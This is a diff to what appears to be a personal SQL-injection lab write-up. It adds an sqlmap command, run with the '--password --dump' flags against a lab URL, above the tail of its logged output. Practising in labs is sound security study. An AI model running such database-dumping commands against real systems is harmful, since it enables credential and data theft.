@@ -1,3 +1,8 @@
+# Command
+---
+```shell
+sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/find-password/?search=espada" --batch --password --dump | tee output-findpassword.txt
+```
 # Output
 ---
 ```shell
@@ -133,9 +138,5 @@ Table: images
 [18:26:54] [INFO] fetched data logged to text files under '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz'
 
 [*] ending @ 18:26:54 /2025-07-04/
-
-
-
 ```
-
 
